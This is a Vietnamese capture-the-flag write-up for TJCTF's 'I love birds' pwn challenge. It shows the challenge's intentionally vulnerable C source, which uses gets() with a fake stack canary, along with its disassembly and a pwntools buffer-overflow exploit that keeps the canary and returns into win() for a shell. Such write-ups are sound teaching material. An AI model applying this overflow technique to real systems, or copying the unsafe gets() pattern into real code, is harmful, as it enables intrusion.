# TJCTF

## Pwn 
1. Pwn/I love birds

    ![image](https://hackmd.io/_uploads/SkU-PYCXlx.png)

+ Source code birds.c: 

        #include <stdio.h>
        #include <stdlib.h>
        
        void gadget() {
            asm("push $0x69;pop %rdi");
        }


        void win(int secret) {
            if (secret == 0xA1B2C3D4) {
                system("/bin/sh");
            }
        }


        int main() {
            setvbuf(stdout, NULL, _IONBF, 0);
            setvbuf(stdin, NULL, _IONBF, 0);

            unsigned int canary = 0xDEADBEEF;

            char buf[64];    // 64 bytes chứa trong char 

            puts("I made a canary to stop buffer overflows. Prove me wrong!");
            gets(buf);    // buffer overflow 

            if (canary != 0xDEADBEEF) {     
                puts("No stack smashing for you!");
                exit(1);
            }


            return 0;
        }
Nhìn vào source code trong file birds.c, trong code này có 3 điểm cần lưu í: 
- Bug: gets(buf) là lỗi buffer overflow, cụ thể là hàm gets không kiểm tra kích thước của biến khai báo đầu vào, vậy nếu người dùng nhập vào lớn hơn 64 bytes của biến char => sẽ sinh ra buffer overflow (tràn bộ nhớ). 
- Fake Canary : 
+ Trong buffer overflow, có 1 kĩ thuật được gọi là stack canary - kĩ thuật dùng để phát hiện lỗi buffer overflow. Giải thích 1 chút về stack canary thì chúng ta sẽ đặt 1 cái giá trị trên stack, và giá trị này sẽ thay đổi mỗi lần khi chương trình được khởi động. Trước khi hàm trả về, stack canary được kiểm tra và nếu có vẻ như đã được sửa đổi, chương trình sẽ thoát ngay lập tức.
+ Quay lại đoạn code, chúng ta có thể thấy có 1 giá trị canary là 0xDEADBEEF, tuy nhiên thì cái canary này chỉ có 4 bytes và tồn tại dưới dạng local variables bình thường, vậy có nghĩa là canary này không được đặt đúng cách giữa vulnerable buffer và return address => giá trị canary này phải được giữ nguyên. 
- Hàm 
 
              void win(int secret) {
              if (secret == 0xA1B2C3D4) {
                  system("/bin/sh");

Chúng ta sẽ cần set giá trị của secret = 0xA1B2C3D4 để trigger ra hàm win, nhưng secret được set như 1 variable kiểu int. 

Ta đã có 1 vài hướng đi khi nhìn source code, vậy tiếp tục ta sẽ xem thử file birds xem nó có những gì, mình sẽ xem thử code trong IDA: 
![image](https://hackmd.io/_uploads/S1NF8BKXgl.png)

Với hướng đi từ birds.c ở trên, khi check IDA chúng ta có thể tóm gọn lại vấn đề : chương trình này kiểm tra input và check giá trị của biến v5, giá trị biến v5 chính là 0xDEADBEEF kiểu int, thì biến v5 chính là biến 32 bit với giá trị 4 bytes(giá trị kiểu int), vậy nên hướng đi của bài này chính là chúng ta cần kiểm soát được giá trị saved RIP nhưng vẫn giữ nguyên được giá trị biến v5 = 0xDEADBEEF => từ đó ghi đè vào được hàm win để có thể gọi ra file /bin/sh. 

Sau khi đã có được hướng đi, ta sẽ tiến hành debug sâu vào trong file birds : 
```
 0x00000000004011ee <+0>:     endbr64
   0x00000000004011f2 <+4>:     push   rbp
   0x00000000004011f3 <+5>:     mov    rbp,rsp
   0x00000000004011f6 <+8>:     sub    rsp,0x50
   0x00000000004011fa <+12>:    mov    rax,QWORD PTR [rip+0x2e3f]        # 0x404040 <stdout@GLIBC_2.2.5>
   0x0000000000401201 <+19>:    mov    ecx,0x0
   0x0000000000401206 <+24>:    mov    edx,0x2
   0x000000000040120b <+29>:    mov    esi,0x0
   0x0000000000401210 <+34>:    mov    rdi,rax
   0x0000000000401213 <+37>:    call   0x4010b0
   0x0000000000401218 <+42>:    mov    rax,QWORD PTR [rip+0x2e31]        # 0x404050 <stdin@GLIBC_2.2.5>
   0x000000000040121f <+49>:    mov    ecx,0x0
   0x0000000000401224 <+54>:    mov    edx,0x2
   0x0000000000401229 <+59>:    mov    esi,0x0
   0x000000000040122e <+64>:    mov    rdi,rax
   0x0000000000401231 <+67>:    call   0x4010b0
   0x0000000000401236 <+72>:    mov    DWORD PTR [rbp-0x4],0xdeadbeef
   0x000000000040123d <+79>:    lea    rax,[rip+0xdcc]        # 0x402010
   0x0000000000401244 <+86>:    mov    rdi,rax
   0x0000000000401247 <+89>:    call   0x401080
   0x000000000040124c <+94>:    lea    rax,[rbp-0x50]
   0x0000000000401250 <+98>:    mov    rdi,rax
   0x0000000000401253 <+101>:   mov    eax,0x0
   0x0000000000401258 <+106>:   call   0x4010a0
   0x000000000040125d <+111>:   cmp    DWORD PTR [rbp-0x4],0xdeadbeef
   0x0000000000401264 <+118>:   je     0x40127f <main+145>
   0x0000000000401266 <+120>:   lea    rax,[rip+0xddd]        # 0x40204a
   0x000000000040126d <+127>:   mov    rdi,rax
   0x0000000000401270 <+130>:   call   0x401080
   0x0000000000401275 <+135>:   mov    edi,0x1
   0x000000000040127a <+140>:   call   0x4010c0
   0x000000000040127f <+145>:   mov    eax,0x0
   0x0000000000401284 <+150>:   leave
   0x0000000000401285 <+151>:   ret
```
Đây là đoạn code sau khi chúng ta sử dụng command disas main ở trong gdb, sau khi đọc assembly ta có thể thấy giá trị 0xdeadbeef được compare với rbp-0x4(truy xuất vào địa chỉ bộ nhớ cách địa chỉ lưu trữ của rbp 4 bytes), vậy nên ta sẽ set breakpoint ở dòng 111 và tiếp tục chạy chương trình đến breakpoint với giá trị 0x40125d:  

Sau đó trong gdb, ta dùng câu lệnh info fucntion để lấy ra giá trị hàm win, trong gdb của mình thì giá trị hàm win là 0x00000000004011c4. 

Lấy được giá trị hàm win, ta có thể bắt đầu thực hiện viết exploit với mục đích là padding mà vẫn giữ nguyên được canary là 0xdeadbeef: 

```
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./birds"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("tjc.tf", 31625)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


payload = b'A'*0x48 + b'B'*4 + p32(0xdeadbeef) + p64(0) + p64(0x4011c4)

ddebug()
io.sendline(payload)
io.interactive()
```
![image](https://hackmd.io/_uploads/rJbOIYC7lx.png)




